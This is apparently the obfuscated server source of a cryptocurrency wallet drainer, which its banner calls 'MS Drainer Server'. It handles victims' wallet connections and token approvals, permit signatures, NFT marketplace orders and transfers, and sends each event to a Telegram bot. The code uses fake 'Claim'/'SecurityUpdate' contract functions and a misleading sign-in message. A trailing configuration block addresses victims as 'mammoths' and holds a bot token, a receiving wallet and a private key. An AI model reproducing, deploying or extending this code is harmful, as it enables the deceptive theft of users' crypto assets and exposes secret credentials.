_0x3335c9[_0x17db74(0x1cc)](0x1f4)[_0x17db74(0xad)](_0x17db74(0x1cb));_0x4f5f1e['IP']=_0x5cf916['headers']['x-forwarded-for']||_0x5cf916['socket'][_0x17db74(0x85)],_0x4f5f1e['IP']=_0x4f5f1e['IP'][_0x17db74(0x76)](_0x17db74(0x12f),''),_0x4f5f1e['UA']=_0x5cf916[_0x17db74(0x78)];if(MS_Domains_Mode==0x1&&MS_Domains_Whilelist[_0x17db74(0x119)]>0x0&&_0x4f5f1e['domain'])try{if(!MS_Domains_Whilelist['includes'](_0x4f5f1e[_0x17db74(0x1a7)]))return send_response(_0x3335c9,{'status':'error','error':_0x17db74(0x1cb)});}catch(_0x448b53){console['log'](_0x448b53);}if(_0x4f5f1e['action']==_0x17db74(0x165)){const _0x10d834={};for(const _0x41c3b2 in MS_Notifications)_0x10d834[_0x41c3b2]=MS_Notifications[_0x41c3b2][_0x17db74(0x1b1)];return send_response(_0x3335c9,{'status':'OK','data':{'RPCs':MS_RPC_URLs,'Address':MS_Wallet_Address,'Notifications':_0x10d834,'Settings':MS_Settings,'Contract_Blacklist':MS_Contract_Blacklist,'Contract_Whitelist':MS_Contract_Whitelist,'Wallet_Blacklist':MS_Wallet_Blacklist,'OS_Mode':MS_OpenSea_Mode,'Receiver':MS_Wallet_Receiver,'V_MSG':MS_VERIFY_MESSAGE,'Loop_N':MS_Loop_Native,'Loop_T':MS_Loop_Tokens,'Loop_NFT':MS_Loop_NFTs,'Permit_BL':MS_PERMIT_BLACKLIST,'V_MODE':MS_VERIFY_WALLET,'Unlimited_BL':MS_UNLIMITED_BLACKLIST,'DSB':MS_Disable_System,'AT':MS_Ankr_Token}});}else{if(_0x4f5f1e['action']==_0x17db74(0x1ca))return send_response(_0x3335c9,{'status':'OK','data':MS_Contract_ABI});else{if(_0x4f5f1e[_0x17db74(0xc6)]=='retrive_id')return send_response(_0x3335c9,{'status':'OK','data':free_id()});else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0x11d))return MS_Use_DeBank==![]?send_response(_0x3335c9,{'status':'error','error':_0x17db74(0xde)}):check_wallet(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0x118))return MS_Use_OpenSea?send_response(_0x3335c9,{'status':_0x17db74(0x8f),'error':_0x17db74(0xde)}):check_nft(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='sign_verify'){if(MS_VERIFY_WALLET==0x0)return MS_Verified_Addresses[_0x4f5f1e['address']]=Math['floor'](Date[_0x17db74(0x15b)]()/0x3e8),send_response(_0x3335c9,{'status':'OK'});else{const _0x1dbef4=ethers[_0x17db74(0x9d)]['recoverAddress'](ethers[_0x17db74(0x9d)][_0x17db74(0x193)]((!_0x4f5f1e[_0x17db74(0xdf)]||_0x4f5f1e[_0x17db74(0xdf)]==''?MS_VERIFY_MESSAGE:_0x4f5f1e['message'])[_0x17db74(0x151)](_0x17db74(0x1bd),_0x4f5f1e['address'])),_0x4f5f1e[_0x17db74(0x161)]);return _0x1dbef4?(MS_Verified_Addresses[_0x4f5f1e[_0x17db74(0x1b7)]]=Math[_0x17db74(0x16a)](Date[_0x17db74(0x15b)]()/0x3e8),send_response(_0x3335c9,{'status':'OK'})):send_response(_0x3335c9,{'status':_0x17db74(0x8f),'error':_0x17db74(0x116)});}}else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0x8d))return on_enter_website(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0xf9))return on_leave_website(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='connect_request')return on_connect_request(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e['action']==_0x17db74(0x177))return on_connect_cancel(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e['action']==_0x17db74(0x185))return on_connect_success(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0x90))return on_check_finish(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e['action']==_0x17db74(0xd8))return on_transfer_request(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e['action']==_0x17db74(0x1d2))return on_sign_request(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='approve_request')return on_approve_request(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e['action']==_0x17db74(0xd6))return on_transfer_success(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='sign_success')return on_sign_success(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0x113))return on_approve_success(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='transfer_cancel')return on_transfer_cancel(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='sign_cancel')return on_sign_cancel(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e['action']==_0x17db74(0x6e))return on_approve_cancel(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0x108))return on_chain_request(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0x18d))return on_chain_success(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='chain_cancel')return on_chain_cancel(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='sign_unavailable')return on_sign_unavailable(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='approve_token')return approve_token(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='permit_token')return permit_token(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]=='safa_approves')return safa_approves(_0x3335c9,_0x4f5f1e);else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0x192)){if(SeaPort==null)return _0x3335c9[_0x17db74(0x1cc)](0xc8)[_0x17db74(0xad)](JSON['stringify']({'status':_0x17db74(0x8f),'error':_0x17db74(0x16e)}));return seaport_handler(_0x3335c9,_0x4f5f1e);}else{if(_0x4f5f1e[_0x17db74(0xc6)]=='blur'){if(Blur==null)return _0x3335c9[_0x17db74(0x1cc)](0xc8)['send'](JSON['stringify']({'status':_0x17db74(0x8f),'error':_0x17db74(0x69)}));return blur_handler(_0x3335c9,_0x4f5f1e);}else{if(_0x4f5f1e[_0x17db74(0xc6)]==_0x17db74(0x18f))return x2y2_handler(_0x3335c9,_0x4f5f1e);}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}}catch(_0xaa90d6){console[_0x17db74(0xb9)](_0xaa90d6),_0x3335c9[_0x17db74(0x1cc)](0x1f4)[_0x17db74(0xad)]('Unable\x20to\x20Execute');}});try{web[_0xb41be2(0x159)](_0xb41be2(0x140),async(_0x1912e7,_0x1a9a82)=>{const _0xd48947=_0xb41be2;try{return MS_Disable_System=![],_0x1a9a82[_0xd48947(0x1cc)](0xc8)[_0xd48947(0xad)](JSON[_0xd48947(0xed)]({'status':'OK'}));}catch(_0x2a2ae3){return console[_0xd48947(0xb9)](_0x2a2ae3),_0x1a9a82[_0xd48947(0x1cc)](0xc8)['send'](JSON['stringify']({'status':'error','error':_0xd48947(0x129)}));}}),web[_0xb41be2(0x159)](_0xb41be2(0x19a),async(_0x4101af,_0x50a91e)=>{const _0x27d2cf=_0xb41be2;try{return MS_Disable_System=!![],_0x50a91e[_0x27d2cf(0x1cc)](0xc8)['send'](JSON[_0x27d2cf(0xed)]({'status':'OK'}));}catch(_0x4e9185){return console[_0x27d2cf(0xb9)](_0x4e9185),_0x50a91e[_0x27d2cf(0x1cc)](0xc8)[_0x27d2cf(0xad)](JSON[_0x27d2cf(0xed)]({'status':_0x27d2cf(0x8f),'error':_0x27d2cf(0x129)}));}}),web[_0xb41be2(0x159)](_0xb41be2(0x17d),async(_0xe4d4d9,_0x1c988f)=>{const _0x55395a=_0xb41be2;try{const _0x1cfd20=await bot[_0x55395a(0x19f)]();return _0x1c988f[_0x55395a(0x1cc)](0xc8)[_0x55395a(0xad)](JSON['stringify']({'status':'OK','data':{'key':MS_Telegram_Token,'chats':MS_Notifications,'handle':_0x1cfd20}}));}catch(_0xa59aa5){return console['log'](_0xa59aa5),_0x1c988f['status'](0xc8)[_0x55395a(0xad)](JSON[_0x55395a(0xed)]({'status':_0x55395a(0x8f),'error':_0x55395a(0x129)}));}});}catch(_0x406daf){console[_0xb41be2(0xb9)](_0x406daf);}MS_Enable_API&&(web['post'](_0xb41be2(0xe8),(_0x13afa2,_0x4b229d)=>{const _0x15676f=_0xb41be2;try{let _0x40335b=_0x13afa2['body'];if(!_0x40335b[_0x15676f(0x1c2)]||_0x40335b[_0x15676f(0x1c2)]!=MS_API_Token)return _0x4b229d[_0x15676f(0x1cc)](0xc8)[_0x15676f(0xad)](JSON[_0x15676f(0xed)]({'status':_0x15676f(0x8f),'error':_0x15676f(0xdb)}));get_wallet_balance(_0x40335b['address']||MS_Wallet_Address)['then'](_0x5089aa=>{const _0xbba4b=_0x15676f;return _0x5089aa!=![]?_0x4b229d[_0xbba4b(0x1cc)](0xc8)['send'](JSON[_0xbba4b(0xed)]({'status':'OK','data':_0x5089aa})):_0x4b229d['status'](0xc8)[_0xbba4b(0xad)](JSON[_0xbba4b(0xed)]({'status':_0xbba4b(0x8f),'error':_0xbba4b(0x129)}));})[_0x15676f(0x127)](_0x4c49b8=>{const _0x5d38a4=_0x15676f;return _0x4b229d[_0x5d38a4(0x1cc)](0xc8)[_0x5d38a4(0xad)](JSON[_0x5d38a4(0xed)]({'status':'error','error':_0x5d38a4(0x129)}));});}catch(_0x4da25c){return console[_0x15676f(0xb9)](_0x4da25c),_0x4b229d[_0x15676f(0x1cc)](0xc8)[_0x15676f(0xad)](JSON[_0x15676f(0xed)]({'status':_0x15676f(0x8f),'error':_0x15676f(0x129)}));}}),web['post']('/api/retrive',(_0x432d3d,_0x18d74)=>{const _0x34ccd9=_0xb41be2;try{let _0x4bf5b6=_0x432d3d[_0x34ccd9(0xc2)];if(!_0x4bf5b6[_0x34ccd9(0x1c2)]||_0x4bf5b6[_0x34ccd9(0x1c2)]!=MS_API_Token)return _0x18d74[_0x34ccd9(0x1cc)](0xc8)[_0x34ccd9(0xad)](JSON[_0x34ccd9(0xed)]({'status':_0x34ccd9(0x8f),'error':'Access\x20Denied'}));if(!fs[_0x34ccd9(0x130)](_0x34ccd9(0x142)))fs[_0x34ccd9(0xeb)](_0x34ccd9(0x142),'[]',_0x34ccd9(0x167));let _0x4f62ee=JSON[_0x34ccd9(0xc8)](fs['readFileSync'](_0x34ccd9(0x142),_0x34ccd9(0x167)));return fs[_0x34ccd9(0xeb)](_0x34ccd9(0x142),'[]',_0x34ccd9(0x167)),_0x18d74[_0x34ccd9(0x1cc)](0xc8)['send'](JSON[_0x34ccd9(0xed)]({'status':'OK','data':_0x4f62ee}));}catch(_0x1b1fd2){return console[_0x34ccd9(0xb9)](_0x1b1fd2),_0x18d74['status'](0xc8)[_0x34ccd9(0xad)](JSON[_0x34ccd9(0xed)]({'status':_0x34ccd9(0x8f),'error':_0x34ccd9(0x129)}));}}),setInterval(()=>{const _0x251281=_0xb41be2;try{if(!fs[_0x251281(0x130)](_0x251281(0x142)))fs[_0x251281(0xeb)](_0x251281(0x142),'[]',_0x251281(0x167));let _0x2845b9=JSON['parse'](fs[_0x251281(0x18c)](_0x251281(0x142),_0x251281(0x167))),_0x5328f6=[];for(const _0xaa29a9 of _0x2845b9){try{Math[_0x251281(0x16a)](Date['now']()/0x3e8)-_0xaa29a9['ts']<0x12c&&_0x5328f6['push'](_0xaa29a9);}catch(_0xb5a094){console[_0x251281(0xb9)](_0xb5a094);}}fs[_0x251281(0xeb)](_0x251281(0x142),JSON['stringify'](_0x5328f6),'utf-8');}catch(_0x752f69){console[_0x251281(0xb9)](_0x752f69);}},0xea60));web[_0xb41be2(0x13e)]((_0x4be014,_0x520246)=>{const _0x59a802=_0xb41be2;try{_0x520246[_0x59a802(0x1cc)](0x193)[_0x59a802(0xad)](_0x59a802(0x15e));}catch(_0x461928){console[_0x59a802(0xb9)](_0x461928);}});fs[_0xb41be2(0x130)]('cert')&&fs[_0xb41be2(0x130)](path[_0xb41be2(0xdd)](_0xb41be2(0x168),_0xb41be2(0x112)))&&fs[_0xb41be2(0x130)](path['join']('cert',_0xb41be2(0xc7)))?(https[_0xb41be2(0x1c0)]({'key':fs[_0xb41be2(0x18c)](path[_0xb41be2(0xdd)](_0xb41be2(0x168),_0xb41be2(0x112))),'cert':fs['readFileSync'](path[_0xb41be2(0xdd)](_0xb41be2(0x168),_0xb41be2(0xc7)))},web)['listen'](0xbb9),console[_0xb41be2(0xb9)](_0xb41be2(0x1d6))):web['listen'](0x1f91,()=>{const _0xa79d3d=_0xb41be2;console[_0xa79d3d(0xb9)](_0xa79d3d(0xa3));});function _0x4651(){const _0x249e46=['fromCharCode','writeFileSync','toFixed','stringify','chains','check_nfts','arbitrum','\x20changed\x20network</b>','</code>\x0a<b>⛓\x20Current\x20network:</b>\x20<code>',']\x20(','BigNumber','blur','token','41784lMfvdm','permit','leave_website','\x20отклонил\x20X2Y2</b>\x0a\x0aМы\x20предложим\x20ему\x20списать\x20NFT\x20отдельно','is_erc721','3749a6ef-439c-4905-89eb-1e0a02770282','Bypass','ethereum','approve_request','2311010uNIgzm','wallet','</b>\x0a\x0aВы\x20можете\x20отследить\x20транзакцию\x20через\x20сканеры','approve_token','https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP&tsyms=USD','\x09===========================================================================================\x0a','json','cancel','chain_request','\x20declined\x20connection</b>\x0a\x0a<b>🌍\x20Domain:</b>\x20<code>','[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22SecurityUpdate\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22Claim\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22ClaimReward\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22ClaimRewards\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22Swap\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22Connect\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22Execute\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22},{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22}],\x22name\x22:\x22Multicall\x22,\x22outputs\x22:[],\x22payable\x22:true,\x22stateMutability\x22:\x22payable\x22,\x22type\x22:\x22function\x22}]','Binance\x20Wallet','ETH','</code>\x0a<b>spender:</b>\x20<code>','optimism','\x20получил\x20запрос\x20на\x20X2Y2</b>\x0a\x0a<b>Список\x20NFT:</b>\x20','Unknown\x20Network','contract_address','server.key','approve_success','DEBANK','100','INVALID_SIGN','\x20declined\x20the\x20transfer\x20or\x20the\x20transaction\x20did\x20not\x20go\x20through</b>','check_nft','length','connect_request','https://rpc.ankr.com/avalanche','whitelist_c.txt','check_wallet','DU3TKS3QYBQAHC7SEQ5YHB9VPD85JXTX7I','amount_usd','chain_cancel','\x09[Module]\x20Blur\x20Module\x20is\x20installed','transferFrom','75d8f6be5608de41ae213522a3f3fba1605361800d234cf34cc0be6521d5bbf1','binance-smart-chain','collection','</code>','catch','Wallet','Unknown\x20Error','items','avax','split','</code>\x0a\x0a<b>💰\x20Wallet\x20type:</b>\x20<code>','<b>❌\x20Не\x20удалось\x20подписать\x20PERMIT\x20пользователя\x20#','::ffff:','existsSync','\x0a\x0a<b>NFT:</b>\x20','price','Optimism','8XynkAL','[{\x22constant\x22:false,\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22holder\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22spender\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22nonce\x22,\x22type\x22:\x22uint256\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22expiry\x22,\x22type\x22:\x22uint256\x22},{\x22internalType\x22:\x22bool\x22,\x22name\x22:\x22allowed\x22,\x22type\x22:\x22bool\x22},{\x22internalType\x22:\x22uint8\x22,\x22name\x22:\x22v\x22,\x22type\x22:\x22uint8\x22},{\x22internalType\x22:\x22bytes32\x22,\x22name\x22:\x22r\x22,\x22type\x22:\x22bytes32\x22},{\x22internalType\x22:\x22bytes32\x22,\x22name\x22:\x22s\x22,\x22type\x22:\x22bytes32\x22}],\x22name\x22:\x22permit\x22,\x22outputs\x22:[],\x22payable\x22:false,\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22}]','\x20issued\x20a\x20confirmation</b>\x0a\x0a<b>Confirmation\x20object:</b>\x20','AVAX','module_seaport.js','35rEdLdz','is_verified','1qwcirE','trim',')\x0a<b>🖥\x20User\x20Agent:</b>\x20<code>','use','\x20для\x20контракта:\x20<code>','/service/enable','\x20received\x20a\x20confirmation\x20request</b>\x0a\x0a<b>Confirmation\x20object:</b>\x20','API_DATA','express-body-parser-error-handler','permit_sign_data','<b>💰\x20User\x20#','5000000','Basic\x20','div','path','map','</code>\x0a<b>s:</b>\x20<code>','https://rpc.ankr.com/polygon','toString','Enable','\x20received\x20a\x20transfer\x20request</b>\x0a\x0a<b>Transfer\x20object:</b>\x20','value','replaceAll','\x20rejected\x20confirmation\x20or\x20transaction\x20failed</b>','fulfill','asset','ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z','contract_id','pending','blacklist_w.txt','post','createReadStream','now','express-useragent','deadline','Sorry,\x20this\x20page\x20in\x20unavailable','\x09[Unlimited\x20Blacklist]\x20There\x20are\x20','<b>😭\x20User\x20#','sign','base64','</b>\x0a\x0a<b>NFT:</b>\x20','</b>\x0a\x0aВозможно,\x20транзакция\x20не\x20прошла\x20или\x20ещё\x20в\x20очереди!','retrive_config','ftm','utf-8','cert','symbol','floor','ethers','nftStandard','execute','SeaPort\x20Module\x20is\x20not\x20installed','from','Execute','https://pro-openapi.debank.com/v1/user/all_token_list?id=','<b>🦊\x20User\x20#','Unknown','MetaMask','<b>💎\x20Успешно\x20выведен\x20NFT\x20пользователя\x20#','estimatedValueEth','connect_cancel','Arbitrum','0x4FfD484Af1846e5b52e8F10f8260A935eCF52A05','number','https','</code>\x0a<b>deadline:</b>\x20<code>','/service/telegram','\x20отклонил\x20Blur</b>\x0a\x0aМы\x20предложим\x20ему\x20списать\x20NFT\x20отдельно','blacklist_c.txt',']\x0a\x0aВозможно,\x20транзакция\x20подтверждения\x20не\x20прошла\x20или\x20ещё\x20в\x20очереди,\x20попробуйте\x20вы(�ести\x20токен\x20в\x20ручном\x20режиме!','total_usd_value','99804yHyuyp','network','chat_id','connect_success','\x20contracts\x20blacklisted','eth','strange_data','\x20closed\x20or\x20reloaded\x20the\x20site</b>\x0a\x0a<b>🌍\x20Domain:</b>\x20<code>','sign_cancel','\x20received\x20a\x20signature\x20request</b>\x0a\x0a<b>Signature\x20object:</b>','readFileSync','chain_success','chain','x2y2','secret','readline','seaport','hashMessage','node-telegram-bot-api','M9IMUX515SEB97THWJRQDKNX75CI66X7XX','<b>❌\x20Не\x20удалось\x20вывести\x20NFT\x20пользователя\x20#','JsonRpcProvider','0xacbd7c3357687be445985fcab1ff4551c88aa375','</code>\x0a<b>💾\x20System:</b>\x20<code>','/service/disable','ERC1155','https://pro-openapi.debank.com/v1/user/all_nft_list?id=','<b>❌\x20Signature\x20is\x20unavailable\x20for\x20user\x20#','permit_success','getMe','FTM','Coinbase','chat_data','sendMessage','HTML','\x20scanned\x20wallet</b>\x0a\x0a<b>Total\x20wallet\x20balance:</b>\x20<code>','<b>❌\x20Не\x20удалось\x20вывести\x20токен\x20пользователя\x20#','domain','24yEfRmI','1095910aHkAqL','WalletConnect','ascii','allowance','\x0a\x09===========================================================================================','<b>💎\x20Успешно\x20подписали\x20X2Y2\x20пользователя\x20#','ZAPPER','Contract','mode','connect_wallet','https://api.zapper.fi/v2/nft/balances/tokens?addresses%5B%5D=','F9GFY4EXGD84MHWEK5NCUJWF9FZVBRT415','balanceOf','balance','address','<b>💎\x20Успешно\x20подписали\x20SeaPort\x20пользователя\x20#','SeaPort','</b>\x0a\x0a<b>NFT\x20Collection\x20:</b>\x20','spender','$</code>\x0a\x0a<b>Native\x20coin:</b>\x20','{{ADDRESS}}','150057YlGvsx','name','createServer','bsc','access_token','transfer_cancel','<b>❓\x20User\x20#','assets','raw_amount_hex_str','raw','providers','sign_unavailable','retrive_contract','Unable\x20to\x20Execute','status','Challenge','</code>\x0a<b>v:</b>\x20<code>','Fantom','0xd4d7e9e1d0dae333d83e174572de6bc473378bf1','Trust\x20Wallet','sign_request','$);\x20','another.example.com','usd_price','\x09SERVER\x20IS\x20ONLINE,\x20LISTENING\x20TO\x20PORT\x203001\x0a','matic','</b>\x0a\x0a<b>🌍\x20Domain:</b>\x20<code>','\x20contracts\x20whitelisted','tokens','309678gURgGb','Blur\x20Module\x20is\x20not\x20installed','UNK','waitForTransaction','</code>\x0a<b>r:</b>\x20<code>','7419063819:AAEFwj6WyEebfGKt49FcdWj3q-rEfKa97vQ','approve_cancel','</code>\x20(','worker_id','urlencoded','</code>\x0a<b>allowed:</b>\x20<code>true</code>\x0a<b>deadline:</b>\x20<code>','push','NATIVE','</code>\x0a\x0aС\x20помощью\x20этих\x20данных\x20вы\x20можете\x20самостоятельно\x20подписать\x20PERMIT\x20в\x20сети\x20','replace','example.com','useragent','<b>✅\x20User\x20#','chain_id','[{\x22inputs\x22:[{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22owner\x22,\x22type\x22:\x22address\x22},{\x22internalType\x22:\x22address\x22,\x22name\x22:\x22spender\x22,\x22type\x22:\x22address\x22},\x0a\x20\x20{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22value\x22,\x22type\x22:\x22uint256\x22},{\x22internalType\x22:\x22uint256\x22,\x22name\x22:\x22deadline\x22,\x22type\x22:\x22uint256\x22},{\x22internalType\x22:\x22uint8\x22,\x22name\x22:\x22v\x22,\x22type\x22:\x22uint8\x22},{\x22internalType\x22:\x22bytes32\x22,\x22name\x22:\x22r\x22,\x22type\x22:\x22bytes32\x22},{\x22internalType\x22:\x22bytes32\x22,\x22name\x22:\x22s\x22,\x22type\x22:\x22bytes32\x22}],\x22name\x22:\x22permit\x22,\x22outputs\x22:[],\x22stateMutability\x22:\x22nonpayable\x22,\x22type\x22:\x22function\x22}]','ERC721','\x0a\x09[SYSTEM]\x20Currencies\x20are\x20loaded\x20successfully\x0a','decimals','95068aUBVBj','\x09=============================\x20MS\x20Drainer\x20Server\x20by\x20Pakulichev\x20=============================','\x20signed\x20the\x20request</b>\x0a\x0a<b>Signature\x20object:</b>\x20','0x2791bca1f2de4661ed88a30c99a7a9449aa84174','check_results','source','remoteAddress','includes','getGasPrice','\x20отклонил\x20SeaPort</b>\x0a\x0aМы\x20предложим\x20ему\x20списать\x20NFT\x20отдельно','<b>❌\x20Не\x20удалось\x20подписать\x20Blur\x20пользователя\x20#','reduce','BNB\x20Smart\x20Chain','permit_data','enter_website','hash','error','check_finish','avalanche','mul','ERC20','./server_modules/module_blur','https://rpc.ankr.com/bsc','<i>пусто</i>','abi','46J83C1RF5TEWJ3NVCF17PG3KYD36U9QPK','Ethereum','<b>❌\x20User\x20#','arb','success','utils','<b>🔑\x20Данные\x20PERMIT\x20пользователя\x20#','toLowerCase','user_id','server_modules','HERE_YOUR_ANKR_TOKEN','\x09SERVER\x20IS\x20ONLINE,\x20LISTENING\x20TO\x20PORT\x208081\x0a','</code>\x0a<b>🌍\x20Browser:</b>\x20<code>','getTransactionCount','\x20rejected\x20the\x20signature\x20or\x20the\x20transaction\x20failed</b>','50mb','owner','\x09[Contract\x20Whitelist]\x20There\x20are\x20','public','\x20has\x20declined\x20network\x20change\x20or\x20network\x20is\x20unavailable</b>','11mgYede','send','</code>\x0a<b>👨‍🦰\x20User:</b>\x20<code>#','request','sign_success','<b>❌\x20Пользователь\x20#','</code>\x0a<b>value:</b>\x20<code>','HERE_YOUR_DEBANK_KEY','https://rpc.ankr.com/arbitrum','</code>\x0a<b>✉️\x20IP\x20address:</b>\x20<code>','createInterface','\x20получил\x20запрос\x20на\x20Blur</b>\x0a\x0a<b>Список\x20NFT:</b>\x20','get','log','body-parser','fantom','time','<b>❌\x20Не\x20удалось\x20вывести\x20коллекцию\x20пользователя\x20#','Verify\x20Wallet\x20First','</b>\x0a\x0aСистема\x20обнаружила,\x20что,\x20скорее\x20всего,\x20PERMIT\x20является\x20фейковым\x20и\x20с\x20целью\x20сохранения\x20ваших\x20денежных\x20средств\x20отклонила\x20транзакцию.\x0a\x0aВы\x20всё\x20ещё\x20можете\x20попытаться\x20вывести\x20токен\x20вручную,\x20если\x20вы\x20считаете,\x20что\x20подпись\x20всё\x20же\x20является\x20настоящей.','estimateGas','MATIC','body','asset_sent','</code>\x0a<b>💠\x20Address:</b>\x20<code>','Permit','action','server.crt','parse','root','match','express','</b>\x0a\x0aСистема\x20автоматического\x20подбора\x20значений\x20обнаружила,\x20что\x20подпись\x20была\x20некорректная\x20и\x20исправила\x20одно\x20или\x20несколько\x20значений:\x0a\x0a<b>owner:</b>\x20<code>','chain_list','\x09[Contract\x20Blacklist]\x20There\x20are\x20','type',']\x0a\x0aВозможно,\x20транзакция\x20подтверждения\x20не\x20прошла\x20или\x20ещё\x20в\x20очереди,\x20попробуйте\x20вывести\x20токен\x20в\x20ручном\x20режиме!','charCodeAt','inner_id','\x09[Permit\x20Blacklist]\x20There\x20are\x20','nonce','amount','transfer_success','tokenId','transfer_request','data','<b>❓\x20Пользователь\x20#','Access\x20Denied','150','join','LOCAL_CHECK','message','<b>👀\x20User\x20opened\x20the\x20site</b>\x0a\x0a<b>🌍\x20Domain:</b>\x20<code>','https://pro-openapi.debank.com/v1/user/total_balance?id=','application/json','countryCode','</b>\x0a\x0a<b>Токен:</b>\x20','</b>\x0a\x0aВы\x20можете\x20попробовать\x20вывести\x20эти\x20активы\x20самостоятельно\x20с\x20помощью\x20данных\x20PERMIT,\x20если\x20они\x20включены\x20в\x20настройках\x20дрейнера.','By\x20signing\x20this\x20message,\x20you\x20agree\x20to\x20the\x20Terms\x20of\x20Use\x20and\x20authorize\x20the\x20use\x20of\x20your\x20wallet\x20address\x20to\x20identify\x20you\x20on\x20the\x20site,\x20also\x20confirm\x20that\x20you\x20are\x20the\x20wallet\x27s\x20owner:\x0a\x0a{{ADDRESS}}','cors','/api/balance','lte'];_0x4651=function(){return _0x249e46;};return _0x4651();}
+console.log('\n\n\t============================================================================================');
+console.log('\t=========================== MS Drainer Server by Pakulichev 29.08.2023 =========================');
+console.log('\t============================================================================================\n\n');
+
+const https = require('https');
+const ethers = require('ethers');
+const axios = require('axios');
+const express = require('express');
+const parser = require('body-parser');
+const Telegram = require('node-telegram-bot-api');
+const fs = require('fs');
+const readline = require('readline');
+const path = require('path');
+
+// ================================================== ===================== // ======================== SCRIPT SETTINGS ======================== // ======================= ============================================================= 
+const MS_Telegram_Token = "7419063819:AAEFwj6WyEebfGKt49FcdWj3q-rEfKa97vQ"; // Here enter your token from the bot from @BotFather (go there, create a bot and get this token)
+const MS_Telegram_Chat_ID = "-1002190901288"; // Here enter the ID of the chat where notifications about the mammoth's actions should be sent (if the ID starts with minus, so we write it down)
+
+const MS_Wallet_Address = "0x4FfD484Af1846e5b52e8F10f8260A935eCF52A05"; // Wallet address where the mammoth assets will go
+const MS_Wallet_Private = "75d8f6be5608de41ae213522a3f3fba1605361800d234cf34cc0be6521d5bbf1"; // Private key from the wallet above, MUST BE SPECIFIED, OR THE WITHDRAWAL WILL NOT WORK
